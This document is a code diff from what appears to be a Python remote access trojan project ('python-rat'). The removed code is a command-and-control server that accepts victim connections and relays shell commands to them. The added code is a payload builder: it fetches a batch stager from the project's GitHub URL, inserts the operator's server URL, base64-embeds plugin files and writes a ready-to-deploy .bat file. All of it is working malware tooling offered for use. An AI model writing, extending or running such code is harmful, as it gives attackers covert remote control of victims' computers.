@@ -1,166 +1,48 @@
 import os
-import platform
-import socket
-import threading
-import logging
+import requests
+import base64
 
-# Set up logging configuration
-log_file = "logs/server.log"
-os.makedirs(os.path.dirname(log_file), exist_ok=True)
+# Step 1: Create the './plugin' directory if it doesn't exist
+plugin_dir = './plugin'
+if not os.path.exists(plugin_dir):
+    os.makedirs(plugin_dir)
+    print(f"Created directory: {plugin_dir}")
 
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[
-        logging.FileHandler(log_file),
-        logging.StreamHandler()  # This logs to the console
-    ]
-)
+# Step 2: Fetch content from the given URL
+url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/scr/main.bat"
+response = requests.get(url)
+if response.status_code == 200:
+    main_bat_content = response.text
+    print("Fetched content from URL successfully.")
+else:
+    print(f"Failed to fetch content from URL. Status code: {response.status_code}")
+    exit()
 
-if platform.system().startswith("Windows"):
-    try:
-        from pystyle import *
-    except ImportError:
-        os.system("python -m pip install pystyle -q -q -q")
-        from pystyle import *
-elif platform.system().startswith("Linux"):
-    try:
-        from pystyle import *
-    except ImportError:
-        os.system("python3 -m pip install pystyle -q -q -q")
-        from pystyle import *
+# Step 3: Get the server URL from user input
+server_url = input("YOU URL SERVER: ")
 
-banner = Center.XCenter(r"""
-██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗    ██████╗      █████╗ ████████╗
-██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║    ██╔══██╗    ██╔══██╗╚══██╔══╝
-██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║    ██████╔╝    ███████║   ██║   
-██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║    ██╔══██╗    ██╔══██║   ██║   
-██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║    ██║  ██║    ██║  ██║   ██║   
-╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝   ╚═╝   
-                                                                                                            
-""")
-os.system("cls||clear")
-print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
-class Client:
-    def __init__(self, connection, address, client_id):
-        self.connection = connection
-        self.address = address
-        self.client_id = client_id
-        self.data_received = False
+# Replace 'YOUR_URL_HERE_SERVER' with the user-provided server URL
+main_bat_content = main_bat_content.replace("YOUR_URL_HERE_SERVER", server_url)
 
-    def handle(self):
-        while True:
-            if self.data_received:
-                try:
-                    data = self.connection.recv(4096)
+# Step 4: Concatenate all content from files in './plugin' and Base64-encode it
+plugin_content = ""
 
-                    if not data:
-                        break
+# Iterate through all files in the './plugin' directory
+for filename in os.listdir(plugin_dir):
+    filepath = os.path.join(plugin_dir, filename)
+    if os.path.isfile(filepath):
+        with open(filepath, 'r', encoding='utf-8') as file:
+            plugin_content += file.read() + '\n\n\n'  # Add triple newlines between files
 
-                    print(data.decode(), end='')
-                except ConnectionResetError:
-                    break
-                except KeyboardInterrupt:
-                    break
+# Base64-encode the concatenated content
+encoded_plugin_content = base64.b64encode(plugin_content.encode('utf-8')).decode('utf-8')
 
-        #self.connection.close()
+# Replace '<plugin>' in the main.bat content with the encoded plugin content
+main_bat_content = main_bat_content.replace("<plugin>", encoded_plugin_content)
 
-class Server:
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
-        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.bind((host, port))
-        self.server_socket.listen(5)
-        self.clients = []
-        self.client_id = 0
+# Step 5: Save the modified content to a new .bat file
+output_file_path = './modified_main.bat'
+with open(output_file_path, 'w', encoding='utf-8') as file:
+    file.write(main_bat_content)
 
-    def total_clients(self):
-        A = len(self.clients)
-        os.system(f"title clients: {A}")
-
-    def start(self):
-        print(f"[+] Listening on {self.host} {self.port}\n")
-        while True:
-            connection, address = self.server_socket.accept()
-            print(Colors.green+f"\n[*] Connection received on {address[0]} {address[1]}\n[*] SERVER COMMAND: ", end='')
-            client = Client(connection, address, self.client_id)
-            self.clients.append(client)
-            self.client_id += 1
-            self.total_clients()
-            client_thread = threading.Thread(target=client.handle)
-            client_thread.start()
-
-    def show_clients(self):
-        print(Colors.cyan+"\n[*] Connected clients:")
-        for client in self.clients:
-            A = client.client_id + 1
-            print(f"ID: {client.client_id}, IP: {client.address[0]}, Port: {client.address[1]}")
-            os.system(f"title clients: {A}")
-        print("", end='')
-
-    def shell(self, client_id):
-       try:
-           for client in self.clients:
-               if client.client_id == client_id:
-                   print(Colors.yellow + f"[*] Connected to client {client_id}")
-                   client.data_received = True
-                   while True:
-                       command = input("")
-                       if command == "cexit":
-                           os.system("cls||clear")
-                           print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
-                           self.server_commands()
-                       elif command == "clear":
-                           os.system("cls||clear")
-                           print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
-                       client.connection.send(command.encode() + b"\n")
-                       print(f"[*] Sent command: {command}")
-                   break
-           else:
-               print("[-] Client not found\n", end='')
-       except:
-           print(Colors.red + "\n[-] Ctrl+C Detected .......")
-           exit(1)
-    def server_commands(self):
-        try:
-            while True:
-                command = input(Colors.green + "[*] SERVER COMMAND: ")
-                if command.lower() == "exit":
-                    break
-                elif command == "list":
-                    os.system("cls||clear")
-                    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
-                    self.show_clients()
-                elif command == 'help':
-                    os.system("cls||clear")
-                    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
-                    print(Colorate.Vertical(Colors.red_to_purple, """
-                                 ****  SERVER COMMANDS MAIN MENU ****
-
-                        1. id 0    | Entering current shell
-                        2. list    | Show Connected Clients
-                        3. back    | Back To The Server Main Menu 
-                                       More Features Will Be Added
-                                       Follow:- github.com/s1uiasdad/python-rat
-                                                    """, 2))
-                elif command == "clear":
-                    os.system("cls||clear")
-                    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
-                elif command.startswith("id "):
-                    client_id = int(command.split()[1])
-                    self.shell(client_id)
-        except:
-            print(Colors.red+"\n[-] Ctrl+C Detected .......")
-            exit()
-
-if __name__ == "__main__":
-    try:
-        server = Server("0.0.0.0", 9999)
-        server_thread = threading.Thread(target=server.start)
-        server_thread.start()
-        server.server_commands()
-    except KeyboardInterrupt:
-        print(Colors.red+"\n[-] Ctrl+C Detected......")
-        server.stop()
-        exit(1)
+print(f"Modified content saved to {output_file_path}.")
